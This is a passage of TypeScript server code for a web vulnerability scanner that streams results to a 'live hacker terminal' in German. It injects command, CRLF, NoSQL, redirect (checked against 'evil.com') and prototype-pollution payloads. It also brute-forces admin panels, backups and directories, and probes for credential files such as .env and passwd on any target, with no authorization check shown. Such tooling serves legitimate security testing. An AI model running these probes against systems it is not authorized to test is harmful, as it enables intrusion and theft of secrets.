          for (const payload of REDIRECT_PAYLOADS.slice(0, 5)) {
            try {
              const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
              const redirectResp = await fetchWithTimeout(testUrl, {}, 5000);
              
              if (redirectResp.redirectUrl && 
                  (redirectResp.redirectUrl.includes("evil.com") || 
                   redirectResp.redirectUrl.includes("//evil"))) {
                vulnerabilities.push({
                  id: randomUUID(),
                  type: "open_redirect",
                  severity: "medium",
                  url: link,
                  payload: payload,
                  description: `OPEN REDIRECT DETECTED! Can redirect to: ${redirectResp.redirectUrl}`,
                  why: "Open Redirects are used in phishing attacks to redirect users to malicious sites while appearing to come from a trusted domain",
                  solution: "1. Whitelist allowed redirect destinations. 2. Use relative URLs. 3. Never use user input for redirects. 4. If needed, use a mapping (id -> URL)",
                  reference: "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                  poc: `curl -I '${testUrl}'`,
                  recommendation: "Validate redirect URLs against a whitelist of allowed destinations",
                  timestamp: new Date().toISOString(),
                });
                break;
              }
            } catch (e) {}
          }
        }
      }

      scanPhases.push({
        phase: 12,
        name: "Open Redirect Testing",
        status: "Complete",
        details: "Open Redirect tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 13: COMMAND INJECTION TESTING
      // ══════════════════════════════════════════════════════════════════════

      const cmdParams = ["cmd", "exec", "command", "execute", "ping", "query", "code", "run", "do"];
      
      for (const link of linksFound.slice(0, 10)) {
        if (cmdParams.some(p => link.toLowerCase().includes(p + "="))) {
          for (const payload of CMD_PAYLOADS.slice(0, 5)) {
            try {
              const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
              const cmdResp = await fetchWithTimeout(testUrl, {}, 5000);
              
              if (cmdResp.body.includes("uid=") || 
                  cmdResp.body.includes("root:") ||
                  cmdResp.body.includes("Linux ") ||
                  cmdResp.body.includes("Windows ")) {
                vulnerabilities.push({
                  id: randomUUID(),
                  type: "command_injection",
                  severity: "critical",
                  url: link,
                  payload: payload,
                  description: `COMMAND INJECTION DETECTED! System commands executed`,
                  why: "Command Injection allows attackers to execute arbitrary system commands on the server, leading to complete server compromise, data theft, and lateral movement",
                  solution: "1. Never use user input in shell commands. 2. Use safe APIs instead of shell commands. 3. If necessary, use strict whitelisting of allowed characters",
                  reference: "https://owasp.org/www-community/attacks/Command_Injection",
                  poc: `curl '${testUrl}'`,
                  recommendation: "Never pass user input to system commands, use whitelisted parameters",
                  timestamp: new Date().toISOString(),
                });
                break;
              }
            } catch (e) {}
          }
        }
      }

      scanPhases.push({
        phase: 13,
        name: "Command Injection Testing",
        status: "Complete",
        details: "Command Injection tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 14: CRLF Injection Testing
      // ══════════════════════════════════════════════════════════════════════
      for (const link of linksWithParams.slice(0, 5)) {
        for (const payload of CRLF_PAYLOADS.slice(0, 4)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const crlfResp = await fetchWithTimeout(testUrl, {}, 5000);
            
            const responseHeaders = JSON.stringify(crlfResp.headers).toLowerCase();
            if (responseHeaders.includes("x-injected") || 
                responseHeaders.includes("crlf=injection") ||
                responseHeaders.includes("set-cookie") && payload.includes("Set-Cookie")) {
              vulnerabilities.push({
                id: randomUUID(),
                type: "crlf_injection",
                severity: "high",
                url: link,
                payload: payload,
                description: `CRLF INJECTION DETECTED! HTTP header injection possible`,
                why: "CRLF injection allows attackers to inject HTTP headers, leading to session fixation, XSS via header injection, or cache poisoning",
                solution: "Sanitize all user input by removing or encoding CR (\\r) and LF (\\n) characters. Use URL encoding and validate inputs",
                reference: "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
                poc: `curl -I '${testUrl}'`,
                recommendation: "Strip CRLF characters from all user inputs",
                timestamp: new Date().toISOString(),
              });
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 14,
        name: "CRLF Injection Testing",
        status: "Complete",
        details: "CRLF Injection tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 15: NoSQL Injection Testing
      // ══════════════════════════════════════════════════════════════════════
      for (const link of linksWithParams.slice(0, 5)) {
        for (const payload of NOSQL_PAYLOADS.slice(0, 4)) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`);
            const nosqlResp = await fetchWithTimeout(testUrl, {}, 5000);
            
            const bodyLower = nosqlResp.body.toLowerCase();
            const nosqlErrors = [
              "mongodb", "mongo", "$where", "bson", "objectid",
              "cannot read property", "unexpected token", "json parse error",
              "syntaxerror", "castto objectid failed"
            ];
            
            if (nosqlErrors.some(err => bodyLower.includes(err))) {
              vulnerabilities.push({
                id: randomUUID(),
                type: "nosql_injection",
                severity: "critical",
                url: link,
                payload: payload,
                description: `NoSQL INJECTION DETECTED! MongoDB/NoSQL error exposed`,
                why: "NoSQL injection allows attackers to bypass authentication, extract data, or modify database contents in NoSQL databases like MongoDB",
                solution: "Use parameterized queries, sanitize all inputs, and never pass user input directly to NoSQL queries. Use proper ODM/ORM libraries",
                reference: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                poc: `curl '${testUrl}'`,
                recommendation: "Use parameterized queries and input validation for NoSQL databases",
                timestamp: new Date().toISOString(),
              });
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 15,
        name: "NoSQL Injection Testing",
        status: "Complete",
        details: "NoSQL Injection tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 16: Prototype Pollution Testing
      // ══════════════════════════════════════════════════════════════════════
      for (const link of linksWithParams.slice(0, 3)) {
        for (const payload of PROTOTYPE_POLLUTION_PAYLOADS.slice(0, 3)) {
          try {
            const testUrl = link.includes("?") 
              ? `${link}&${payload}` 
              : `${link}?${payload}`;
            const ppResp = await fetchWithTimeout(testUrl, {}, 5000);
            
            if (ppResp.body.includes("admin") && ppResp.body.includes("true")) {
              vulnerabilities.push({
                id: randomUUID(),
                type: "prototype_pollution",
                severity: "critical",
                url: link,
                payload: payload,
                description: `PROTOTYPE POLLUTION DETECTED! Object prototype manipulation possible`,
                why: "Prototype pollution allows attackers to inject properties into JavaScript object prototypes, potentially leading to RCE or privilege escalation",
                solution: "Freeze object prototypes with Object.freeze(Object.prototype). Use Map instead of plain objects. Validate and sanitize all object keys",
                reference: "https://portswigger.net/web-security/prototype-pollution",
                poc: `curl '${testUrl}'`,
                recommendation: "Never merge user-controlled objects without validation",
                timestamp: new Date().toISOString(),
              });
              break;
            }
          } catch (e) {}
        }
      }

      scanPhases.push({
        phase: 16,
        name: "Prototype Pollution Testing",
        status: "Complete",
        details: "Prototype Pollution tests completed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 17: PORT SCANNING - Real Socket-based scan
      // ══════════════════════════════════════════════════════════════════════
      let openPorts: PortScanResult[] = [];
      try {
        openPorts = await scanPorts(parsedUrl.hostname);
      } catch (e) {}

      scanPhases.push({
        phase: 17,
        name: "Port Scanning",
        status: "Complete",
        details: `Found ${openPorts.length} open ports`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 18: DNS ENUMERATION - Extract DNS records
      // ══════════════════════════════════════════════════════════════════════
      let dnsRecords: DNSRecord[] = [];
      try {
        dnsRecords = await enumerateDNS(parsedUrl.hostname);
      } catch (e) {}

      scanPhases.push({
        phase: 18,
        name: "DNS Enumeration",
        status: "Complete",
        details: `Found ${dnsRecords.length} DNS records`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 19: SSL/TLS CERTIFICATE ANALYSIS
      // ══════════════════════════════════════════════════════════════════════
      let sslCertificate: SSLCertInfo | null = null;
      if (parsedUrl.protocol === "https:") {
        try {
          sslCertificate = await analyzeSSL(parsedUrl.hostname);
        } catch (e) {}
      }

      scanPhases.push({
        phase: 19,
        name: "SSL/TLS Analysis",
        status: "Complete",
        details: sslCertificate ? `Certificate valid for ${sslCertificate.daysRemaining} days` : "No HTTPS or analysis failed"
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 20: SUBDOMAIN ENUMERATION
      // ══════════════════════════════════════════════════════════════════════
      let subdomains: SubdomainResult[] = [];
      try {
        // Get base domain (handle www.example.com -> example.com)
        const parts = parsedUrl.hostname.split(".");
        const baseDomain = parts.length > 2 ? parts.slice(-2).join(".") : parsedUrl.hostname;
        subdomains = await enumerateSubdomains(baseDomain);
      } catch (e) {}

      scanPhases.push({
        phase: 20,
        name: "Subdomain Enumeration",
        status: "Complete",
        details: `Found ${subdomains.length} subdomains`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 21: DIRECTORY BRUTE FORCE
      // ══════════════════════════════════════════════════════════════════════
      let directories: DirectoryResult[] = [];
      try {
        directories = await bruteForceDirectories(targetUrl);
      } catch (e) {}

      scanPhases.push({
        phase: 21,
        name: "Directory Brute Force",
        status: "Complete",
        details: `Found ${directories.length} directories/files`
      });

      // ══════════════════════════════════════════════════════════════════════
      // PHASE 22: WAYBACK MACHINE - Historical URLs
      // ══════════════════════════════════════════════════════════════════════
      let waybackUrls: WaybackUrl[] = [];
      try {
        waybackUrls = await fetchWaybackUrls(parsedUrl.hostname);
      } catch (e) {}

      scanPhases.push({
        phase: 22,
        name: "Wayback Machine",
        status: "Complete",
        details: `Found ${waybackUrls.length} historical URLs`
      });

      // ══════════════════════════════════════════════════════════════════════
      // FINAL: Sort and return results
      // ══════════════════════════════════════════════════════════════════════

      const severityOrder: Record<string, number> = { 
        critical: 0, high: 1, medium: 2, low: 3, info: 4 
      };
      vulnerabilities.sort((a, b) => 
        (severityOrder[a.severity] || 5) - (severityOrder[b.severity] || 5)
      );

      const scanDuration = ((Date.now() - startTime) / 1000).toFixed(2);

      scanPhases.push({
        phase: 23,
        name: "Scan Complete",
        status: "Done",
        details: `Total scan time: ${scanDuration}s - KEINE GRENZEN!`
      });

      const result = {
        id: scanId,
        targetUrl,
        timestamp: new Date().toISOString(),
        duration: `${scanDuration}s`,
        status: mainResponse.status,
        serverHeaders,
        serverInfo,
        wafDetected,
        techStack,
        vulnerabilities,
        linksFound,
        formsFound,
        foldersFound,
        adminPanels,
        backupFiles,
        sensitiveFiles,
        scanPhases,
        // New advanced scan results
        openPorts,
        dnsRecords,
        sslCertificate: sslCertificate || undefined,
        subdomains,
        directories,
        waybackUrls,
        summary: {
          total: vulnerabilities.length,
          critical: vulnerabilities.filter(v => v.severity === "critical").length,
          high: vulnerabilities.filter(v => v.severity === "high").length,
          medium: vulnerabilities.filter(v => v.severity === "medium").length,
          low: vulnerabilities.filter(v => v.severity === "low").length,
          info: vulnerabilities.filter(v => v.severity === "info").length,
        }
      };

      res.json(result);
    } catch (error: any) {
      res.status(500).json({ 
        error: "Scan failed",
        message: error.message 
      });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // SSE REAL-TIME SCAN STREAMING ENDPOINT - LIVE HACKER TERMINAL
  // ═══════════════════════════════════════════════════════════════════════════════
  app.get("/api/scan/stream", async (req, res) => {
    const targetUrl = req.query.target as string;
    
    if (!targetUrl) {
      return res.status(400).json({ error: "Target URL required" });
    }

    // Set up SSE headers
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.flushHeaders();

    // Helper to send SSE events
    const sendEvent = (type: string, data: any) => {
      res.write(`data: ${JSON.stringify({ type, ...data })}\n\n`);
    };

    // ALL CATEGORIES SHOW IN TERMINAL - except BACKUP (results only)
    const SILENT_CATEGORIES = ["BACKUP"];
    const sendLog = (message: string, category: string = "TEUFEL") => {
      if (!SILENT_CATEGORIES.includes(category)) {
        sendEvent("log", { message, category, timestamp: new Date().toISOString() });
      }
    };

    try {
      let url = targetUrl;
      if (!url.startsWith("http")) {
        url = "https://" + url;
      }

      let parsedUrl: URL;
      try {
        parsedUrl = new URL(url);
      } catch {
        sendEvent("error", { message: "Ungultige URL" });
        res.end();
        return;
      }

      const baseUrl = `${parsedUrl.protocol}//${parsedUrl.host}`;
      const scanId = randomUUID();
      const startTime = Date.now();

      // Results storage
      const vulnerabilities: VulnerabilityFinding[] = [];
      const linksFound: string[] = [];
      const formsFound: string[] = [];
      const foldersFound: string[] = [];
      const adminPanels: string[] = [];
      const backupFiles: string[] = [];
      const sensitiveFiles: string[] = [];
      const techStack: Record<string, string[]> = {};
      const scanPhases: any[] = [];
      let openPorts: PortScanResult[] = [];
      let dnsRecords: DNSRecord[] = [];
      let sslCertificate: SSLCertInfo | null = null;
      let subdomains: SubdomainResult[] = [];
      let directories: DirectoryResult[] = [];
      let waybackUrls: WaybackUrl[] = [];
      const jsFilesAnalyzed: string[] = [];
      const jsEndpointsDiscovered = new Set<string>();
      const jsParametersDiscovered = new Set<string>();
      const jsSensitiveSignals = new Set<string>();
      const promoCodesDiscovered = new Set<string>();
      const shineCodesDiscovered = new Set<string>();

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 0: INITIALIZATION
      // ═══════════════════════════════════════════════════════════════════
      sendLog("════════════════════════════════════════════════════════════", "TEUFEL");
      sendLog(`ZIEL ERFASST: ${url}`, "TEUFEL");
      sendLog("════════════════════════════════════════════════════════════", "TEUFEL");
      sendLog("ECHTZEIT-STREAMING AKTIVIERT - KEINE GRENZEN MODUS!", "TEUFEL");
      sendEvent("phase", { phase: 0, name: "Initialisierung", status: "active" });

      // Initial connection
      sendLog(`Verbindung zu ${parsedUrl.hostname} wird hergestellt...`, "VERBINDUNG");
      let mainResponse: any;
      try {
        mainResponse = await fetchWithTimeout(url, {}, 15000);
        sendLog(`✓ Verbunden! Status: ${mainResponse.status}`, "VERBINDUNG");
      } catch (error: any) {
        sendLog(`✗ Verbindung fehlgeschlagen: ${error.message}`, "FEHLER");
        sendEvent("error", { message: error.message });
        res.end();
        return;
      }

      const headers = mainResponse.headers;
      const body = mainResponse.body;

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 1: REAL IP & DNS RESOLUTION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 1, name: "DNS-Auflosung", status: "active" });
      sendLog("DNS-Auflosung wird durchgefuhrt...", "DNS");
      
      try {
        const realIPs = await getRealIP(parsedUrl.hostname);
        if (realIPs.length > 0) {
          techStack["Real IP"] = realIPs;
          for (const ip of realIPs) {
            sendLog(`✓ IP gefunden: ${ip}`, "DNS");
          }
        }
      } catch (e) {
        sendLog("✗ IP-Auflosung fehlgeschlagen", "DNS");
      }

      // DNS Enumeration
      sendLog("DNS-Records werden enumeriert (A, AAAA, MX, NS, TXT, CNAME)...", "DNS");
      try {
        dnsRecords = await enumerateDNS(parsedUrl.hostname);
        for (const record of dnsRecords) {
          sendLog(`✓ ${record.type}: ${record.value}${record.priority ? ` (Pri: ${record.priority})` : ""}`, "DNS");
        }
        sendLog(`DNS-Enumeration abgeschlossen: ${dnsRecords.length} Records gefunden`, "DNS");
      } catch (e) {
        sendLog("DNS-Enumeration fehlgeschlagen", "DNS");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 2: TECHNOLOGY DETECTION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 2, name: "Technologie-Erkennung", status: "active" });
      sendLog("Technologie-Stack wird analysiert...", "TECH");
      
      const detectedTech = detectTechStack(headers, body);
      Object.assign(techStack, detectedTech);
      
      for (const [tech, values] of Object.entries(detectedTech)) {
        sendLog(`✓ ${tech}: ${(values as string[]).join(", ")}`, "TECH");
      }

      // WAF Detection
      sendLog("WAF/Schutz-Erkennung lauft...", "WAF");
      const protections = detectProtection(headers, body);
      if (protections.length > 0) {
        techStack["Protection/WAF"] = protections;
        for (const waf of protections) {
          sendLog(`⚠ WAF erkannt: ${waf}`, "WAF");
        }
      } else {
        sendLog("✓ Keine WAF erkannt", "WAF");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 3: PORT SCANNING
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 3, name: "Port-Scanning", status: "active" });
      sendLog("Port-Scanner wird gestartet (25 Ports)...", "PORTS");
      
      const portsToScan = COMMON_PORTS.map(p => p.port);
      for (let i = 0; i < portsToScan.length; i += 5) {
        const batch = portsToScan.slice(i, i + 5);
        sendLog(`Scanne Ports: ${batch.join(", ")}...`, "PORTS");
        const batchResults = await Promise.all(batch.map(port => scanPort(parsedUrl.hostname, port)));
        for (const result of batchResults) {
          if (result.state === "open") {
            openPorts.push(result);
            sendLog(`✓ Port ${result.port} OFFEN - ${result.service}${result.banner ? ` [${result.banner}]` : ""}`, "PORTS");
            // Send live result
            sendEvent("result", { resultType: "open_port", data: result });
          }
        }
      }
      sendLog(`Port-Scan abgeschlossen: ${openPorts.length} offene Ports gefunden`, "PORTS");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 4: SSL/TLS ANALYSIS
      // ═══════════════════════════════════════════════════════════════════
      if (parsedUrl.protocol === "https:") {
        sendEvent("phase", { phase: 4, name: "SSL/TLS-Analyse", status: "active" });
        sendLog("SSL/TLS-Zertifikat wird analysiert...", "SSL");
        
        try {
          sslCertificate = await analyzeSSL(parsedUrl.hostname);
          if (sslCertificate) {
            sendLog(`✓ Subject: ${sslCertificate.subject}`, "SSL");
            sendLog(`✓ Issuer: ${sslCertificate.issuer}`, "SSL");
            sendLog(`✓ Gultig bis: ${sslCertificate.validTo}`, "SSL");
            sendLog(`✓ Protokoll: ${sslCertificate.protocol}`, "SSL");
          }
        } catch (e) {
          sendLog("SSL-Analyse fehlgeschlagen", "SSL");
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 5: SUBDOMAIN ENUMERATION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 5, name: "Subdomain-Enumeration", status: "active" });
      sendLog(`Subdomain-Enumeration fur ${parsedUrl.hostname} wird gestartet...`, "SUBDOMAIN");
      
      const subdomainCount = SUBDOMAIN_WORDLIST.length;
      for (let i = 0; i < SUBDOMAIN_WORDLIST.length; i += 10) {
        const batch = SUBDOMAIN_WORDLIST.slice(i, i + 10);
        sendLog(`Teste Subdomains ${i+1}-${Math.min(i+10, subdomainCount)} von ${subdomainCount}...`, "SUBDOMAIN");
        
        const batchResults = await Promise.allSettled(
          batch.map(async (sub) => {
            const subdomain = `${sub}.${parsedUrl.hostname}`;
            try {
              const ips = await dnsResolve4(subdomain);
              return { subdomain, found: true, ip: ips[0] };
            } catch {
              return { subdomain, found: false };
            }
          })
        );
        
        for (const result of batchResults) {
          if (result.status === "fulfilled" && result.value.found) {
            const subResult = { subdomain: result.value.subdomain, status: 200, ip: result.value.ip, isAlive: true };
            subdomains.push(subResult);
            sendLog(`✓ SUBDOMAIN GEFUNDEN: ${result.value.subdomain} (${result.value.ip})`, "SUBDOMAIN");
            // Send live result
            sendEvent("result", { resultType: "subdomain", data: subResult });
          }
        }
      }
      sendLog(`Subdomain-Enumeration abgeschlossen: ${subdomains.length} gefunden`, "SUBDOMAIN");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 6: ADMIN PANEL DISCOVERY
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 6, name: "Admin-Panel-Suche", status: "active" });
      const adminCount = ADMIN_PATHS.length;
      sendLog(`Admin-Panel-Suche wird gestartet (${adminCount} Pfade)...`, "ADMIN");
      
      for (let i = 0; i < ADMIN_PATHS.length; i += 20) {
        const batch = ADMIN_PATHS.slice(i, i + 20);
        sendLog(`Teste Admin-Pfade ${i+1}-${Math.min(i+20, adminCount)} von ${adminCount}...`, "ADMIN");
        
        const batchResults = await Promise.allSettled(
          batch.map(async (path) => {
            try {
              const testUrl = `${baseUrl}${path}`;
              const resp = await fetchWithTimeout(testUrl, {}, 5000);
              // Only count 200 OK responses as real admin panels
              // 301/302 redirects are usually just URL normalization (adding trailing slash) or redirects to homepage
              if (resp.status === 200) {
                const bodyLower = (resp.body || '').toLowerCase();
                // Verify it's actually an admin/login page - check for login indicators
                const isLoginPage = bodyLower.includes('login') || bodyLower.includes('password') || 
                  bodyLower.includes('passwort') || bodyLower.includes('username') || 
                  bodyLower.includes('sign in') || bodyLower.includes('anmelden') ||
                  bodyLower.includes('admin') || bodyLower.includes('dashboard') ||
                  bodyLower.includes('wp-login') || bodyLower.includes('authenticate');
                if (isLoginPage) {
                  return { path, url: testUrl, status: resp.status, verified: true };
                }
                // Page exists with 200 but doesn't look like login - still report but as unverified
                return { path, url: testUrl, status: resp.status, verified: false };
              }
              // Also report 401/403 as these confirm the path exists and is protected
              if (resp.status === 401 || resp.status === 403) {
                return { path, url: testUrl, status: resp.status, verified: true };
              }
              return null;
            } catch {
              return null;
            }
          })
        );
        
        for (const result of batchResults) {
          if (result.status === "fulfilled" && result.value) {
            const label = result.value.verified ? '✓ ADMIN PANEL' : '? ADMIN PANEL (unverified)';
            adminPanels.push(`${result.value.url} [${result.value.status}]`);
            sendLog(`${label}: ${result.value.url} [${result.value.status}]`, "ADMIN");
            sendEvent("result", { resultType: "admin_panel", data: result.value.url });
          }
        }
      }
      sendLog(`Admin-Panel-Suche abgeschlossen: ${adminPanels.length} gefunden`, "ADMIN");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 7: BACKUP FILE DISCOVERY
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 7, name: "Backup-Dateien-Suche", status: "active" });
      sendLog("Backup-Dateien werden gesucht...", "BACKUP");
      
      const backupPaths: string[] = [];
      for (const file of BASE_FILES) {
        for (const ext of BACKUP_EXTENSIONS) {
          backupPaths.push(`/${file}${ext}`);
        }
      }
      // Add domain-specific backups
      const domainParts = parsedUrl.hostname.replace(/\./g, "_");
      for (const ext of BACKUP_EXTENSIONS.slice(0, 20)) {
        backupPaths.push(`/${domainParts}${ext}`);
      }
      // Backup files: Only count 200 OK with non-HTML content (real file downloads)
      for (let i = 0; i < backupPaths.length; i += 50) {
        const batch = backupPaths.slice(i, i + 50);
        sendLog(`Teste Backup-Pfade ${i+1}-${Math.min(i+50, backupPaths.length)} von ${backupPaths.length}...`, "BACKUP");
        
        const batchResults = await Promise.allSettled(
          batch.map(async (bkPath) => {
            try {
              const testUrl = `${baseUrl}${bkPath}`;
              const resp = await fetchWithTimeout(testUrl, {}, 3000);
              // Only 200 OK, must have content, and shouldn't be an HTML error page
              if (resp.status === 200 && resp.body && resp.body.length > 50) {
                const isHtml = resp.body.trim().startsWith('<!') || resp.body.trim().startsWith('<html');
                // Backup files should NOT be HTML pages (those are soft 404s)
                if (!isHtml) return testUrl;
                // Unless it's a .html backup specifically
                if (bkPath.endsWith('.html')) return testUrl;
              }
              return null;
            } catch {
              return null;
            }
          })
        );
        
        for (const result of batchResults) {
          if (result.status === "fulfilled" && result.value) {
            backupFiles.push(result.value);
            sendLog(`✓ BACKUP GEFUNDEN: ${result.value}`, "BACKUP");
            sendEvent("result", { resultType: "backup_file", data: result.value });
          }
        }
      }
      sendLog(`Backup-Suche abgeschlossen: ${backupFiles.length} gefunden`, "BACKUP");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 8: SENSITIVE FILES DISCOVERY
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 8, name: "Sensitive-Dateien-Suche", status: "active" });
      const sensitiveCount = SENSITIVE_FILES.length;
      sendLog(`Sensitive Dateien werden gesucht (${sensitiveCount} Pfade)...`, "SENSITIVE");
      
      // Get homepage body length for comparison (to filter out soft-404s)
      const homepageBodyLen = body.length;
      
      for (let i = 0; i < SENSITIVE_FILES.length; i += 15) {
        const batch = SENSITIVE_FILES.slice(i, i + 15);
        sendLog(`Teste Sensitive-Pfade ${i+1}-${Math.min(i+15, sensitiveCount)}...`, "SENSITIVE");
        
        const batchResults = await Promise.allSettled(
          batch.map(async (filePath) => {
            try {
              const testUrl = `${baseUrl}${filePath}`;
              const resp = await fetchWithTimeout(testUrl, {}, 5000);
              // Only 200 OK with real content
              if (resp.status === 200 && resp.body && resp.body.length > 20) {
                // Filter out soft 404s (pages that return 200 but show homepage/error page)
                // If response body is very close to homepage length, it's probably a soft 404
                const bodyLen = resp.body.length;
                if (Math.abs(bodyLen - homepageBodyLen) < 200) return null;
                // Check it's not just an HTML error page
                const isHtml = resp.body.trim().startsWith('<!') || resp.body.trim().startsWith('<html');
                const isSensitiveContent = filePath.includes('.env') || filePath.includes('.git') || 
                  filePath.includes('config') || filePath.includes('.sql') || filePath.includes('.log') ||
                  filePath.includes('passwd') || filePath.includes('credentials') || filePath.includes('.key') ||
                  filePath.includes('.pem') || filePath.includes('backup') || filePath.includes('.bak');
                // For sensitive files, HTML responses are usually false positives (error pages)
                if (isSensitiveContent && isHtml) return null;
                return { url: testUrl, size: bodyLen, path: filePath };
              }
              return null;
            } catch {
              return null;
            }
          })
        );
        
        for (const result of batchResults) {
          if (result.status === "fulfilled" && result.value) {
            sensitiveFiles.push(result.value.url);
            sendLog(`✓ SENSITIV: ${result.value.url} (${result.value.size} bytes)`, "SENSITIVE");
            sendEvent("result", { resultType: "sensitive_file", data: result.value });
            // Add vulnerability for sensitive file
            const isCritical = /\.env|\.git|config|passwd|shadow|htpasswd|credentials|secret|key/i.test(result.value.path);
            vulnerabilities.push({
              id: randomUUID(),
              type: "sensitive_file",
              severity: isCritical ? "critical" : "high",
              url: result.value.url,
              description: `Sensitive Datei exponiert: ${result.value.path} (${result.value.size} bytes)`,
              why: "Exponierte sensitive Dateien konnen Zugangsdaten, Konfigurationen und interne Informationen preisgeben",
              solution: "Zugriff auf sensitive Dateien uber Webserver-Konfiguration blockieren",
              reference: "https://owasp.org/www-project-web-security-testing-guide/",
              timestamp: new Date().toISOString(),
            });
          }
        }
      }
      sendLog(`Sensitive-Suche abgeschlossen: ${sensitiveFiles.length} gefunden`, "SENSITIVE");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 9: DIRECTORY BRUTEFORCE
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 9, name: "Verzeichnis-Bruteforce", status: "active" });
      const dirCount = DIRECTORY_WORDLIST.length;
      sendLog(`Verzeichnis-Bruteforce wird gestartet (${dirCount} Pfade)...`, "DIR");
      
      for (let i = 0; i < DIRECTORY_WORDLIST.length; i += 15) {
        const batch = DIRECTORY_WORDLIST.slice(i, i + 15);
        sendLog(`Teste Verzeichnisse ${i+1}-${Math.min(i+15, dirCount)}...`, "DIR");
        
        const batchResults = await Promise.allSettled(
          batch.map(async (dirPath) => {
            try {
              const testUrl = `${baseUrl}${dirPath}`;
              const resp = await fetchWithTimeout(testUrl, {}, 5000);
              // Only count 200 OK - 301/302 are just URL normalization
              if (resp.status === 200) {
                // Filter soft 404s
                if (resp.body && Math.abs(resp.body.length - homepageBodyLen) < 200) return null;
                return { path: testUrl, status: resp.status };
              }
              // 403 Forbidden also confirms directory exists
              if (resp.status === 403) {
                return { path: testUrl, status: resp.status };
              }
              return null;
            } catch {
              return null;
            }
          })
        );
        
        for (const result of batchResults) {
          if (result.status === "fulfilled" && result.value) {
            directories.push(result.value);
            foldersFound.push(result.value.path);
            sendLog(`✓ VERZEICHNIS: ${result.value.path} [${result.value.status}]`, "DIR");
            // Send live result
            sendEvent("result", { resultType: "directory", data: result.value });
          }
        }
      }
      sendLog(`Verzeichnis-Bruteforce abgeschlossen: ${directories.length} gefunden`, "DIR");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 10: WAYBACK MACHINE - ALLE ALTEN LINKS ANZEIGEN!
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 10, name: "Wayback-Machine", status: "active" });
      sendLog("════════════════════════════════════════════════════════════", "WAYBACK");
      sendLog("WAYBACK MACHINE - HISTORISCHE URLS WERDEN GESUCHT!", "WAYBACK");
      sendLog("════════════════════════════════════════════════════════════", "WAYBACK");
      sendLog(`Suche alle alten Links fur: ${parsedUrl.hostname}...`, "WAYBACK");
      
      try {
        waybackUrls = await fetchWaybackUrls(parsedUrl.hostname);
        if (waybackUrls.length > 0) {
          sendLog(`✓ ${waybackUrls.length} HISTORISCHE URLS GEFUNDEN!`, "WAYBACK");
          sendLog("────────────────────────────────────────────────────────────", "WAYBACK");
          // Show ALL old links in terminal and send live results
          for (const wbUrl of waybackUrls) {
            sendLog(`→ ${wbUrl.url}`, "WAYBACK");
            sendLog(`  📅 Archiviert: ${wbUrl.timestamp}`, "WAYBACK");
            // Send live result
            sendEvent("result", { resultType: "wayback_url", data: wbUrl });
          }
          sendLog("────────────────────────────────────────────────────────────", "WAYBACK");
          sendLog(`Gesamt: ${waybackUrls.length} alte URLs aus dem Archiv`, "WAYBACK");
        } else {
          sendLog("Keine archivierten URLs gefunden", "WAYBACK");
        }
      } catch (e) {
        sendLog("Wayback-Abfrage fehlgeschlagen", "WAYBACK");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 11: WHOIS LOOKUP
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 11, name: "WHOIS-Abfrage", status: "active" });
      sendLog("WHOIS-Informationen werden abgefragt...", "WHOIS");
      
      let whoisInfo: WhoisInfo | null = null;
      try {
        whoisInfo = await lookupWhois(parsedUrl.hostname);
        if (whoisInfo) {
          sendLog(`✓ Domain: ${whoisInfo.domain}`, "WHOIS");
          if (whoisInfo.registrar) sendLog(`✓ Registrar: ${whoisInfo.registrar}`, "WHOIS");
          if (whoisInfo.creationDate) sendLog(`✓ Erstellt: ${whoisInfo.creationDate}`, "WHOIS");
